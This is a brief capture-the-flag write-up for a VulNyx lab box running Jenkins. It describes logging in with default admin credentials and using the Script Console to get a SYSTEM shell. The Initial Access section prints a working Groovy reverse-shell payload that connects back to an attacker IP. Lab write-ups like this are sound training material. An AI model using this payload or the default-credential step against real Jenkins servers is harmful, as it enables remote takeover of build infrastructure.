# URL
https://vulnyx.com/#build
# Concept
* RCE through web app admin functions
* CI/CD compromise
* Jenkins hacking
# Method of solve
## Starting Enumeration
* there are a lot of ports open on this box, but only port `8080` matters
## Initial Access
* the web app running on port `8080` is Jenkins, a CI/CD web app
* the app is running with default credentials, `admin:admin`
* once logged into Jenkins, we can access the admin script console in the following way:
  * Go to `Manage Jenkins`
  * Go to `Script Console` all the way down at the bottom of the page
  * Use the following Groovy script payload to get a reverse shell on the target:
```
String host="192.168.212.10";int port=443;String cmd="cmd";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Privilege Escalation
* no need for privilege escalation, we're running as `NT AUTHORITY / SYSTEM`
